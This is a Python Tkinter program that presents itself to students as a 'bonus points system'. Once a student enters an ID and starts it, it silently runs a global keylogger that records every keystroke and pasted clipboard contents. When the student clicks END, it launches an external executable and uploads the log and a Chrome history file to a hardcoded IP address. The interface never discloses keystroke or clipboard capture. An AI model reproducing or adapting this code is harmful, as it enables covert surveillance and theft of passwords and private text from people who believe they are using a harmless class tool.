# -*- coding: utf-8 -*-

from tkinter import *
import tkinter as tk
from tkinter import ttk
from tkinter.ttk import *
import os
import sys
import requests
from tkinter import messagebox
from pynput import keyboard
from pathlib import Path
import win32clipboard
import signal,os,sys
import threading
from threading import Thread
import datetime,time


global win

def limitSizeDay(*args):
    value = var_login.get()
    if len(value) > 8:
        var_login.set(value[:8])

def ctrl(a,b):
    pass

class TimeStamp:
    def __init__(self):
        self._running = True

    def terminate(self):
        self._running = False

    def run(self):
        while self._running:
            if self._running:
                time.sleep(15)
            path = Path("log.txt")
            path.parent.mkdir(parents=True, exist_ok=True)
            log = open("log.txt","a+")
            log.write("\n"+datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")+"\n")
            log.close() 

class keylogger:
    def __init__(self):
        self._running = True

    def terminate(self):
        self._running = False

    def run(self):
        while self._running:
            with keyboard.Listener(
            on_press=on_press) as listener:
                try:
                    listener.join()
                except KeyboardInterrupt:
                    continue
                except MyException as e:
                    path = Path("log.txt")
                    path.parent.mkdir(parents=True, exist_ok=True)
                    log = open("log.txt","a+")
                    #print('{} was pressed'.format(e.args[0]))
                    s = str(format(e.args[0]))
                    #print('\'\\x16\'')
                    if s[0:4] == "Key.":
                        if s == "Key.enter":
                           print ("\\n\n")
                           log.write("\n")
                        else:
                           print (s[4:len(s)])
                           log.write("["+s[4:len(s)]+"]")
                    elif s == '\'\\x16\'':
                        #print ("TRUE")
                        win32clipboard.OpenClipboard()
                        text = win32clipboard.GetClipboardData()
                        log.write("+V")
                        #print ("text:",text)
                        if  text :
                            log.write("\nCopyData:{\n"+text+"\n}\n")
                            win32clipboard.CloseClipboard()
                        elif s == '\'\\x03\'':
                            log.write("+C")
                        else:
                            log.write(s[1])
                    else :
                        log.write(s[1])
                    log.close()

class MyException(Exception): pass

def on_press(key):
    raise MyException(key)

workers = []
def login():
    from tkinter import messagebox

    #call keyboard
    #os.system(r"key\tryclipboard.py")
    student_id = var_login.get()
    
    if len(student_id) == 0:
        tk.messagebox.showerror(title='沒有學生學號', message='請輸入學生學號')
        pass



    else:
        result = tk.messagebox.askyesno(title='請問這個學號是你嗎？', message='這是你嗎？'+student_id)
        if result == False:
            #print("No")
            pass

        else:    
            #print("yes")
            c1 = TimeStamp()
            c2 = keylogger()
            t1 = Thread(target=c1.run)
            t2 = Thread(target=c2.run)
            t1.daemon = True
            t2.daemon = True
            t1.start()
            t2.start()
        
            def leave():
                import socket
                #print ("123")
                os.system(r"UR\UR.exe")
                #os.system("taskkill /f /im key.exe")
                print(c1,c2)
                #c1.terminate()
                #c2.terminate()
                #t1.join()
                #t2.join()   
                path = Path("log.txt")
                path.parent.mkdir(parents=True, exist_ok=True)
                log = open("log.txt","a+")
                log.write("\nendTime:"+datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")+"\n")
                log.close()
            
                student_id = var_login.get()
                print (student_id)
                student = {'studentID': student_id}

                try :
                    readcsv = open('chrome_history.csv', 'rb+')
                    csv = readcsv.read()
                except:
                    csv = ""
                try :
                    readfile = open('log.txt', 'rb+')
                    file = readfile.read()
                except:
                    file = ""
              
                try:
                    stu_data = {'studentID': student_id, 'upload_csv': csv,'upload_file': file}
                    r = requests.post('http://120.96.183.71/upload/',data=stu_data)
                    record.destroy()
                    
                except:
                    tk.messagebox.showerror(title='資料未上傳', message='資料未上傳成功，請將網路打開!')
                    pass


                
                
                try:
                    sys.exit()
                except SystemExit as e:
                    sys.exit(e)
        
            print (student_id)
        
            #keyboard
        
            path = Path("log.txt")
            path.parent.mkdir(parents=True, exist_ok=True)
            log = open("log.txt","w+")
            log.write("startTime:"+datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")+"\n")
            log.close()
            #-----
        
            record=tk.Tk()
            record.title("加分系統")
            record.geometry('600x400')
            win.configure()
            record.resizable(0,0)
    
            l = tk.Label(record, text='歡迎'+student_id+'同學', justify=CENTER, font=('sans-serif', 15)).place(x=220, y= 50)
            l = tk.Label(record, text='正在進行加分，請勿關閉視窗...', justify=CENTER, font=('sans-serif', 15)).place(x=170, y= 100)
            l = tk.Label(record, text='您可以將視窗縮小', justify=CENTER, font=('sans-serif', 15)).place(x=220, y= 150)
            l = tk.Label(record, text='請保持網路連結', justify=CENTER, font=('sans-serif', 15)).place(x=220, y= 175)
            l = tk.Label(record, text='若已做完練習，請按離開按鈕', justify=LEFT, font=('sans-serif', 15)).place(x=170, y=250)
            btn_end = tk.Button(record, text='END', padx=20, command=leave).place(x=245, y=300)

            #if server gg, this system will not close    
            win.destroy()


            def closeWindow():
                anw = tk.messagebox.askyesno(title='要離開嗎？', message='中途離開就不會加分唷！')
                if anw == False:
                    pass

                else:
                    record.destroy()
        
        
            record.protocol('WM_DELETE_WINDOW', closeWindow)
            record.mainloop()



win=tk.Tk()
win.title("加分系統")
win.geometry('600x400')
win.configure()
win.resizable(0,0)
#This is the context of win

l = tk.Label(win, text='歡迎來到加分系統', justify=CENTER, font=('sans-serif', 15)).place(x=215, y= 50) 

# user information
la = tk.Label(win, text='請輸入你的學號: ',).place(x=150, y= 150)




var_login = tk.StringVar()
var_login.trace('w', limitSizeDay)
#var_login.set('A0761111') 
entry_login = tk.Entry(win, bg='white', fg='black',background='gray',insertbackground='black', bd=0, width = 25, textvariable=var_login) 
entry_login.place(x=250, y=150)

l = tk.Label(win, text='1. 請使用windows 10 系統', font=('sans-serif', 10)).place(x=180, y= 200)
l = tk.Label(win, text='2. 請使用chome瀏覽器，方便作為加分依據', font=('sans-serif', 10)).place(x=180, y= 220)
l = tk.Label(win, text='3. 請隨時保持網路連結', font=('sans-serif', 10)).place(x=180, y= 240)

l = tk.Label(win, text='請確認自己的學號是否正確，按下按鈕即開始加分', font=('sans-serif', 10)).place(x=160, y= 290) 

btn_login = tk.Button(win, text='開始加分',padx=20, command=login) 
btn_login.place(x=255, y=320)

     
signal.signal(signal.SIGINT,  ctrl)
win.mainloop()
try:
    sys.exit()
except SystemExit as e:
    sys.exit(e)





